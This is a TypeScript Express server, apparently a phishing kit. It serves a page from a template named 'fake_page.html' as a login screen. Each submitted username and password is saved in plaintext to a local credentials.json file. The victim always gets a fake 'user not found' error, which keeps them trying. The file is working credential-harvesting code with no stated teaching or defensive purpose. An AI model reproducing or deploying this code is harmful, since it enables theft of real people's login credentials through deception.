import express, { Request, Response } from 'express';
import path from 'path';
import fs from 'fs';
import { exec } from 'child_process';

const app = express();
const PORT: number = 3000;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files (CSS, images, etc.)
app.use(express.static('public'));
app.use('/assets', express.static('src/assets'));

// Counter for login attempts
let tentativas: number = 5;

// Function to open browser
const openBrowser = (url: string): void => {
    const start = process.platform === 'darwin' ? 'open' :
                  process.platform === 'win32' ? 'start' : 'xdg-open';
    exec(`${start} ${url}`);
};

// Interface for login data
interface LoginData {
    usuario: string;
    senha: string;
    timestamp?: string;
}

// Function to save credentials to JSON file
const saveCredentialsToJson = (usuario: string, senha: string): void => {
    const loginData: LoginData = {
        usuario: usuario,
        senha: senha,
        timestamp: new Date().toISOString()
    };

    const credentialsPath = path.join(__dirname, '../credentials.json');

    try {
        // Read existing data or create empty array
        let existingData: LoginData[] = [];
        if (fs.existsSync(credentialsPath)) {
            const fileContent = fs.readFileSync(credentialsPath, 'utf8').trim();
            if (fileContent.length > 0) {
                try {
                    existingData = JSON.parse(fileContent);
                } catch (parseError) {
                    console.log('Invalid JSON in credentials.json, starting fresh');
                    existingData = [];
                }
            }
        }

        // Add new login data
        existingData.push(loginData);

        // Write back to file
        fs.writeFileSync(credentialsPath, JSON.stringify(existingData, null, 2));
        console.log('Credentials saved to credentials.json');
    } catch (error) {
        console.error('Error saving credentials:', error);
    }
};

// Route for the main login page
app.get('/', (req: Request, res: Response): void => {
    try {
        const htmlTemplate = fs.readFileSync(path.join(__dirname, 'fake_page.html'), 'utf8');
        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
        
        // Show error message if there's an error parameter
        const showError = req.query.error === 'invalid';
        if (showError) {
            htmlWithData = htmlWithData.replace('{{error_message}}', '<div style="color: red; font-size: 14px; margin-top: 10px;">• Usuário não encontrado</div>');
        } else {
            htmlWithData = htmlWithData.replace('{{error_message}}', '');
        }
        
        res.send(htmlWithData);
    } catch (error) {
        console.error('Error reading HTML template:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Handle login form submission
app.post('/login', (req: Request, res: Response): void => {
    const { usuario, senha } = req.body;

    // Save credentials to JSON file
    saveCredentialsToJson(usuario, senha);

    // Decrease attempts counter
    tentativas = Math.max(0, tentativas - 1);

    // Log the attempt and redirect back with error
    console.log(`Login attempt saved: ${usuario}`);
    res.redirect('/?error=invalid');
});

app.listen(PORT, (): void => {
    const url = `http://localhost:${PORT}`;
    console.log(`Servidor rodando em ${url}`);

    // Automatically open browser
    console.log('Abrindo navegador...');
    openBrowser(url);
});